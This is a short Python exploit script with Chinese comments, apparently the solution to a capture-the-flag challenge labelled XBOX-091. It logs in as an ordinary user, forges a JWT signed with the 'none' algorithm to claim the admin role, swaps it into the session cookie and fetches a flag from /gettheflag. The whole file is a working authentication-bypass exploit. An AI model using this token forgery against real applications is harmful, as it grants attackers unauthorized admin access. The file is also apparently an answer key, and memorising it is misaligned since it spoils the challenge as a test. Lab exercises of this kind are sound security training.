# coding:utf-8
import requests
import jwt
import re
import sys

"""
@文件命名：XBOX-091
@使用方式: python 091.py http://localhost:5003
@简述思路: 利用JWT None算法漏洞伪造admin权限token获取flag
"""


def Scan(url):
    flag = ""
    try:
        session = requests.Session()
        login_data = {"username": "user", "password": "user"}
        session.post(f"{url}/login", data=login_data)
        original_token = session.cookies.get("token")
        payload = {"username": "user", "role": "admin"}
        admin_token = jwt.encode(payload, "", algorithm="none")
        session.cookies.set("token", admin_token)
        response = session.get(f"{url}/gettheflag")
        # 匹配 flag{xxxx} 或 FLAG{xxxx}
        match = re.search(r"(flag|FLAG)\{.*?\}", response.text)
        if match:
            flag = match.group(0)
    except Exception as e:
        print(e)
    return flag


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("用法: python exp.py <url>")
    else:
        print(Scan(url=sys.argv[1]))
